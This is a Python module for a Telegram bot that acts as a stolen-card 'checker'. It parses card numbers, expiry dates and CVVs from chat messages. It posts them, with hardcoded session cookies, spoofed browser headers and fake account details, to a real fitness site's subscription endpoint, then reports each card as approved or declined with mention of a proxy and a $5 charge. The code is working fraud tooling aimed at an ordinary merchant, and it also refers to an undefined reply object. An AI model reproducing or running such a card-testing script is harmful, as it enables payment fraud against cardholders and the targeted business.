import re
import requests
import time
from pyrogram import Client, filters
from EQUROBOT import app

import requests
import re

# Function to extract credit card details from message text
def extract_credit_card_details(message_text):
    cards = []
    input = re.findall(r"[0-9]+", message_text)
    
    if not input or len(input) < 3:
        return cards
    
    if len(input) == 3:
        ccn = input[0]
        if len(input[1]) == 3:
            mm = input[1][:2]
            yy = input[1][2:]
            cvv = input[2]
        else:
            mm = input[2][:2]
            yy = input[2][2:]
            cvv = input[1]
    else:
        ccn = input[0]
        if len(input[1]) == 3:
            mm = input[2]
            yy = input[3]
            cvv = input[1]
        else:
            mm = input[1]
            yy = input[2]
            cvv = input[3]

    if len(yy) != 2 or not (1 <= int(mm) <= 12):
        return cards

    if len(cvv) not in [3, 4]:
        return cards

    cards.append([ccn, mm, yy, cvv])
    return cards

# Function to process credit card transaction and handle responses
async def process_credit_card_transaction(message, ccn, mm, yy, cvv):
    fullcc = f"{ccn}|{mm}|{yy}|{cvv}"

    # Define your cookies here
    cookies = {
        '_gcl_au': '1.1.355957066.1718880093',
        '_ga': 'GA1.1.1315831686.1718880093',
        'optiMonkClientId': '8e208f7c-eaf7-cfd3-e65a-776249b40307',
        'ci_session': '31qd8h80hgpiuslcs2ud36seqp9bklio',
        '_ga_4HXMJ7D3T6': 'GS1.1.1718895011.2.1.1718895012.0.0.0',
        '_ga_KQ5ZJRZGQR': 'GS1.1.1718895011.2.1.1718895179.0.0.0',
    }

    # Define your headers here
    headers = {
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.lagreeod.com',
        'priority': 'u=1, i',
        'referer': 'https://www.lagreeod.com/subscribe',
        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    # Data to be sent in the POST request
    data = {
        'stripe_customer': '',
        'subscription_type': 'Monthly Subscription',
        'firstname': 'warrior ',
        'lastname': 'losy',
        'email': 'koyllels@gmail.com',
        'password': 'kikikikiki',
        'card[name]': 'Warrior',
        'card[number]': ccn,
        'card[exp_month]': mm,
        'card[exp_year]': yy,
        'card[cvc]': cvv,
        'coupon': '',
        's1': '10',
        'sum': '28',
    }

    # API endpoint URL
    url = 'https://www.lagreeod.com/register/validate_subscribe'

    try:
        # Send POST request with cookies, headers, and data
        response = requests.post(url, cookies=cookies, headers=headers, data=data)
        response_data = response.json()

        if 'status' in response_data:
            if response_data['status'] == 'declined':
                die_message = (
                    f"┏━━━━━━━⍟\n"
                    f"┃DECLINED ❌\n"
                    f"┗━━━━━━━━━━━⊛\n"
                    f"➩ 𝗖𝗮𝗿𝗱 : `{fullcc}`\n"
                    f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : **{response_data['message']}**\n\n"
                    f"[↯] 𝗣𝗿𝗼𝘅𝘆 ↳ 104.207.45.101:xxx Live ✅\n"
                    f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : {message.from_user.mention}\n"
                )
                await reply.edit_text(die_message)

            elif response_data['status'] == 'approved':
                approved_message = (
                    f"┏━━━━━━━⍟\n"
                    f"┃BRAINTREE AUTH 𝟓$ ✅\n"
                    f"┗━━━━━━━━━━━⊛\n"
                    f"➩ 𝗖𝗮𝗿𝗱 : `{fullcc}`\n"
                    f"➩ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 : APPROVED CARD ✅\n"
                    f"➩ 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 : CHARGED 5$\n\n"
                    f"[↯] 𝗣𝗿𝗼𝘅𝘆 ↳ 104.207.45.101:xxx Live ✅\n"
                    f"➩ 𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 : {message.from_user.mention}\n"
                )
                await reply.edit_text(approved_message)

            else:
                await reply.edit_text(f"Unknown status received: {response_data.get('status')}")

    except Exception as e:
        print(f"Error processing transaction: {e}")

# Example usage:
# Assuming `message` and credit card details `ccn`, `mm`, `yy`, `cvv` are defined appropriately
# await process_credit_card_transaction(message, ccn, mm, yy, cvv)
